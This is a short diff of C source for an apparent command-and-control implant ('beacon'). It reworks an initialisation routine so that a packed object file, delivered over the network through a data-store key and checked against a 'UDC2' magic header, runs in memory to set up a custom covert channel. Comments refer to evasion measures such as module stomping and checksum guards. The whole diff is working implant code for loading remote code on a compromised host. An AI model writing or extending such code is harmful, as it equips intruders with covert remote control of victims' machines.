@@ -140,32 +140,38 @@ void udc2_close(void) {
 }
 
 BOOL udc2_init(void) {
+	/* engage protocol: setting 87 = 1 marks this beacon as UDC2. The
+	 * packed BOF arrives over the wire through the PROVEN data-store task
+	 * (key "udc2", blob = [int 'UDC2'][int objlen][int entry][wire
+	 * object]) during the first HTTP cycle - config-region blobs of this
+	 * size overflow the guard-checksum budget and the module-stomping
+	 * host image, so they must not ride the settings patch. */
 	char * blob;
-	int    len;
+	int    objlen;
 	int    entry;
+	int    magic;
 
 	if (udc2.booted)
 		return udc2_enabled();
 
 	udc2.booted = TRUE;
 
-	blob = setting_ptr(SETTING_UDC2_BOF);
-	len = (int)setting_int(SETTING_UDC2_LENGTH);
-	entry = (int)setting_int(SETTING_UDC2_ENTRY);
-
-	/* DEBUG probe: 0x60 arg1=ptr? arg2=len arg3=entry - remove after the
-	 * live-chain bring-up. These land in the console as Unknown error 96
-	 * even when the channel itself never engages (HTTP fallback). */
-	post_error_dd(0x60, (DWORD)len, (DWORD)entry);
-
-	if (blob == NULL || len <= 0 || entry < 0)
+	if (setting_int(SETTING_UDC2_LENGTH) != 1)
 		return FALSE;
 
-	/* run the BOF: go(UDC2_INFO*) fills in our function pointers */
-	if (!command_inline_execute_object_parsed(blob, len, (DWORD)entry, (char *)&udc2.info, sizeof(UDC2INFO), 0)) {
-		post_error_dd(0x61, (DWORD)len, (DWORD)entry);
+	blob = (char *)BeaconGetValue("udc2");
+	if (blob == NULL)
 		return FALSE;
-	}
+
+	magic  = *(int *)(blob + 0);
+	objlen = *(int *)(blob + 4);
+	entry  = *(int *)(blob + 8);
+
+	if (magic != 0x32434455 /* 'UDC2' LE */ || objlen <= 0 || entry < 0)
+		return FALSE;
+
+	if (!command_inline_execute_object_parsed(blob + 12, objlen, (DWORD)entry, (char *)&udc2.info, sizeof(UDC2INFO), 0))
+		return FALSE;
 
 	return udc2.info.proxy != NULL;
 }
